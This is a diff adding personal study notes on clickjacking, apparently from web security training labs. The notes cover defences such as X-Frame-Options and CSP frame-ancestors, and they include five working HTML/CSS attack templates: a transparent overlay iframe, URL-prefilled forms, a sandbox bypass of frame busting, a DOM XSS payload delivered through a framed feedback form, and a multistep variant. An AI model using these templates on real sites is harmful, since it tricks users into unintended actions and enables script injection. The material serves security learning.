@@ -1,0 +1,165 @@
+Clickjacking:
+- Interface-based attack which a user is tricked into clicking action on hidden website by clicking on other content in decoy web
+- This technique is possible whenever website can be framed.
+- Different from CSRF:
+    + Clickjacking need click, CSRF don't need
+    + Clickjacking trick user to click hidden UI, CSRF fake all the request
+    + Clickjacking see a decoy web, CSRF don't see anything
+- Hidden iframe in real web -> User is tricked to click -> Valid token include in request -> Send request with valid token + real domain -> Server accept action
+
+Construct a basic clickjacking attack:
+- Must fix the click div in same position as what you want victim click
+
+Clickjacking with prefilled form input:
+- Can prefill form input by putting param in url
+
+Frame busting scripts:
+- This is technique for defense against clickjacking, based upon restricting the framing capability for websites.
+    + Common client-side protection is use frame busting or frame breaking scripts
+    + Can be implement Javascript add-on or extensions such as Noscript
+- Often perform some or all following behaviors:
+    + Check and enforce that the current application window is the main or top window,
+    + Make all frames visible
+    + Prevent clicking on visible frames
+    + Intercept and flag potential clickjacking attacks to the user.
+- This technique depend on browser, platform specific and can be bypass 
+- Effective way for attacker is to use HTML5 iframe sandbox attribute
+    + When set with allow-forms or allow-scripts values and allow-top-navigation value is omitted, frame busting can't check whether or not it is the top window
+    <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
+
+Combining clickjacking with a DOM XSS attack:
+- Historically, this used to perform behaviors such as boosting likes on Fb page
+- However, true potency is revealed when used for DOM XSS attack
+
+Multistep clickjacking:
+- In some case, manipulation of input to target web may need multiple actions.
+    Example: Buying product need to put it in shopping basket and checkout.
+- These actions can implemented by using multiple divisions or iframes
+
+How to prevent clickjacking attacks:
+- 2 mechanism for server-side protection: X-Frame-Options, Content Security Policy (CSP)
+- X-Frame-Options:
+    + Orinally introduced as an unofficial response header in Internet Explorer 8 (IE8) adn rapidly adopted within other browsers.
+    + Provide website owneer control over use of iframe object
+        X-Frame-Options: deny
+        X-Frame-Options: sameorigin
+        X-Frame-Options: allow-from https://test.com
+    + Not implemented consistently across browsers (allow-from not supported in Chrome 76, Safari 12 for example)
+    + When applied combine with CSP, provide effective protection
+- Content Security Policy:
+    + Detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking.
+    + Usually implemented as a return header of form:
+        Content-Security-Policy: policy
+        + where policy is a string of policy directives separated by semicolons.
+    + The recommended clickjacking protection is to incorporate the 'frame-ancestors' directive in the application's Content Security Policy
+        Content-Security-Policy: frame-ancestors 'none';    (Same as X-Frame-Options deny)
+        Content-Security-Policy: frame-ancestors 'self';    (same as sameorigin)
+        Content-Security-Policy: frame-ancestors normal-website.com;
+
+01_Basic_clickjacking_with_CSRF_token_protection
+- No comment
+<style>
+    iframe {
+        position:relative;
+        width: 1400px;
+        height: 800px;
+        opacity: 0.8;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 540px;
+        left: 160px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="{url}/my-account"></iframe>
+
+02_Clickjacking_with_form_input_data_prefilled_from_a_URL_parameter
+- Can prefill by adding param to url
+<style>
+    iframe {
+        position:relative;
+        width: 1400px;
+        height: 800px;
+        opacity: 0.8;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 500px;
+        left: 160px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="{url}/my-account?email=test@gmail.com"></iframe>
+
+03_Clickjacking_with_a_frame_buster_script
+- This lab has frame busting technique to prevent clickjacking, but can bypass using sandbox
+<style>
+    iframe {
+        position:relative;
+        width: 1400px;
+        height: 800px;
+        opacity: 0.8;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 500px;
+        left: 160px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="{url}/my-account?email=test@gmail.com" sandbox="allow-forms"></iframe>
+
+04_Exploiting_clickjacking_vulnerability_to_trigger_DOM_based_XSS
+- Combine XSS and clickjacking
+- You can easily find XSS vuln in submit feedback, so try to trigger it through clickjacking
+<style>
+    iframe {
+        position:relative;
+        width: 1700px;
+        height: 1000px;
+        opacity: 0.8;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 820px;
+        left: 300px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="{url}/feedback?name=<img src=1 onerror=print()>&email=test@gmail.com&subject=test&message=test"></iframe>
+
+05_Multistep_clickjacking
+- You can perform multiple step using multiple css class and div
+<style>
+    iframe {
+        position:relative;
+        width: 1400px;
+        height: 800px;
+        opacity: 0.8;
+        z-index: 2;
+    }
+    .first {
+        position:absolute;
+        top: 540px;
+        left: 160px;
+        z-index: 1;
+    }
+    .second {
+        position:absolute;
+        top: 330px;
+        left: 300px;
+        z-index: 1;
+    }
+</style>
+<div class="first">Click me first</div>
+<div class="second">Click me next</div>
+<iframe src="{url}/my-account"></iframe>
